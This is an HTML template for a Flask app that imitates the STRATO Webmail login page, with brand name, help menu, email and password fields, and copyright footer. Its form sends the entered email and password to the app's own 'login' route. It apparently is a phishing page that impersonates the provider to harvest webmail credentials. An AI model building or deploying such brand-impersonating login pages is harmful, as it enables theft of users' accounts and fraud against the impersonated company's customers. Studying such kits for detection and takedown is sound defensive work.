<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>STRATO Webmail Login</title>

<!-- Bootstrap -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Bootstrap Icons -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">

<style>

body{
background:#f4f5f9;
font-family: Arial, Helvetica, sans-serif;
}


/* HEADER */

.header{
padding:25px 60px;
display:flex;
justify-content:space-between;
align-items:center;
}

.logo img{
height:38px;

}


.menu span{
margin-left:30px;
font-size:14px;
color:#2c2f6b;
}


/* LOGIN AREA */

.login-wrapper{
margin-left:350px;
margin-top:1px;
max-width:650px;
}


/* TITLES */

.small-title{
font-size:26px;
color:#333;
margin-bottom:0;
}

.big-title{
font-size:60px;
font-weight:800;
color:#2c2f6b;
margin-top:-15px;
}


/* INPUTS */

.form-control{

height:58px;
border-radius:10px;
font-size:18px;
padding-left:55px;
border:1px solid #ddd;
background:#f7f7fb;

}


.input-holder{
position:relative;
margin-top:20px;
}


.input-icon{
position:absolute;
left:18px;
top:16px;
font-size:20px;
color:#2c2f6b;
}


/* LINKS */

.forgot{
margin-top:12px;
display:inline-block;
color:#2c2f6b;
text-decoration:underline;
}


/* BUTTON */

.login-btn{

margin-top:30px;

height:55px;

border-radius:50px;

border:none;

width:100%;

font-size:20px;

color:black;

background:linear-gradient(90deg,#ff8c00,#ffb000);

}


/* FOOTER */

.footer{

position:fixed;

bottom:0;

width:100%;

background:#ececf2;

padding:15px 40px;

font-size:14px;

display:flex;

justify-content:space-between;

}

.footer a{

margin-right:20px;

color:#2c2f6b;

text-decoration:none;

}

</style>

</head>


<body>



<!-- HEADER -->
<div class="header">


<div class="logo">

<img src="{{ url_for('static' ,filename ="img/logo.png") }}" alt="STRATO Logo">

</div>



<div class="menu">

<span>
<i class="bi bi-question-circle"></i>
Help & Contact
</span>

<span>
<i class="bi bi-globe"></i>
English (US)
</span>

<span>
<i class="bi bi-person"></i>
Customer Login
</span>

</div>

</div>




<!-- LOGIN AREA -->


<div class="login-wrapper">

<div class="small-title">

STRATO Webmail

</div>


<div class="big-title">

LOGIN

</div>



<form method="POST" action="{{ url_for('login') }}">



<div class="input-holder">

<i class="bi bi-envelope input-icon"></i>

<input
type="email"
name="email"
class="form-control"
placeholder="Email address"
required>

</div>




<div class="input-holder">

<i class="bi bi-lock input-icon"></i>

<input
type="password"
name="password"
class="form-control"
placeholder="Password"
required>

</div>



<a href="#" class="forgot">

Forgot your password?

</a>



<div class="form-check mt-3">

<input class="form-check-input" type="checkbox" checked>

<label class="form-check-label">

Stay signed in

</label>

</div>



<button class="btn login-btn">

Sign in

</button>



</form>

</div>




<!-- FOOTER -->

<div class="footer">


<div>

<a href="#">STRATO-HOSTING.co.uk</a>

<a href="#">Terms & Conditions</a>

<a href="#">Privacy Policy</a>

<a href="#">Imprint</a>

</div>


<div>

© 2026 Open-Xchange GmbH Version: 8.42.5

</div>

</div>



</body>
</html>
